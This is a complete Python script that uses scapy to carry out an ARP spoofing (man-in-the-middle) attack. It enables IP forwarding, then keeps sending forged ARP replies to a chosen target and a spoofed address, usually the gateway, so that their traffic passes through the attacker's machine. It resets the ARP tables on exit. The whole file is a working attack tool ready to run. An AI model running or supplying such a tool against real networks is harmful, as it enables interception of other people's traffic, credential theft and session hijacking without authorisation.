#!/usr/bin/env python

import scapy.all as scapy
import time
import optparse
import sys
import subprocess

subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4,verbose=False)


def handler_user_input():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP")
    parser.add_option("-s", "--spoof", dest="spoof_ip", help="Fake IP")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please use -t or --target before specifying a target IP, use -- help for more info")

    if not options.spoof_ip:
        parser.error("[-] Please use -s or -- spoof before specifying the fake IP, use -- help for more info")

    return options.target_ip, options.spoof_ip


sent_packets_count = 0

target_ip_and_spoof_ip = handler_user_input()


try:
    while True:
        spoof(target_ip_and_spoof_ip[0], target_ip_and_spoof_ip[1])
        spoof(target_ip_and_spoof_ip[1], target_ip_and_spoof_ip[0])
        sent_packets_count += 2
        print("\r[+] Packets sent " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)


except KeyboardInterrupt:
    print("[+] Detected Ctrl + C ... Resetting ARP tables...\n")
    restore(target_ip_and_spoof_ip[0], target_ip_and_spoof_ip[1])
    restore(target_ip_and_spoof_ip[1], target_ip_and_spoof_ip[0])


